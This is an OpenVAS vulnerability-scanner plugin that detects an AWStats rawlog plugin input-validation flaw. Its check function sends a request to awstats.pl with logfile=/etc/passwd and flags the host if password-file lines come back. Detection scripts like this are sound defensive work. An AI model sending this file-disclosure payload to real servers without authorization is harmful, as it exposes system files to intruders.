# OpenVAS Vulnerability Test
# $Id: awstats_input_vuln.nasl 17 2013-10-27 14:01:43Z jan $
# Description: AWStats rawlog plugin logfile parameter input validation vulnerability
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Netwok Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host seems to be running AWStats, a free real-time logfile analyzer.

AWStats Rawlog Plugin is reported prone to an input validation vulnerability. 
The issue is reported to exist because user supplied 'logfile' URI data passed
to the 'awstats.pl' script is not sanitized.

An attacker may exploit this condition to execute commands remotely or disclose 
contents of web server readable files.";

tag_solution = "Upgrade to the latest version of this software";

# Ref: Johnathan Bat <spam@blazemail.com>

if(description)
{
 script_id(14347);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(10950);

 name = "AWStats rawlog plugin logfile parameter input validation vulnerability";

 script_name(name);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Determines the presence of AWStats awstats.pl";

 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 script_family("Web application abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

function check(url)
{
	req = http_get(port:port, item:url + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + get_host_name() + "&framename=main&pluginmode=rawlog&logfile=/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(0);
	if ( egrep(pattern:"root:.*:0:[01]:.*", string:res) )
	{
	 	security_hole(port);
	 	exit(0);
	}
}

check(url:"/awstats");
check(url:"/stats");
check(url:"/stat");
foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
